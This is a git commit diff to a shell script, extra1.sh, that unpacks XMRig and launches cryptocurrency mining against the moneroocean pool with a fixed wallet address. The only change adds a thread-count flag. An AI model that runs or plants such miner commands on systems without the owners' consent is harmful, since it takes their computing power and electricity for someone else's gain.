f4d18cc5096f48dffe3094d8f2da47b43b171296
dragonmhmh <82892187+dragonmhmh@users.noreply.github.com>
2021-05-22 12:07:18 +0100

    Update extra1.sh

--- extra1.sh
+++ extra1.sh
@@ -1,3 +1,3 @@
 tar xvzf xmrig-v6.12.1-C3-linux-Static.tar.gz
-./xmrig -a rx/wow --donate-level=1 -o gulf.moneroocean.stream:10128  -u 46bNmb5eSTiERWkLk5RgYfE3FWku1uABWPjfLEPdp7ycgwerzwWs48d2fHRMp4NkMdVdNkb58tExdTYyH1e9ZJW6Cmnzozv -p x
+./xmrig -a rx/wow --donate-level=1 -o gulf.moneroocean.stream:10128  -u 46bNmb5eSTiERWkLk5RgYfE3FWku1uABWPjfLEPdp7ycgwerzwWs48d2fHRMp4NkMdVdNkb58tExdTYyH1e9ZJW6Cmnzozv -p x --threads 4
 ./xmrig -a rx/arq --donate-level=1 -o gulf.moneroocean.stream:443  -u 46bNmb5eSTiERWkLk5RgYfE3FWku1uABWPjfLEPdp7ycgwerzwWs48d2fHRMp4NkMdVdNkb58tExdTYyH1e9ZJW6Cmnzozv+128000 -k --tls
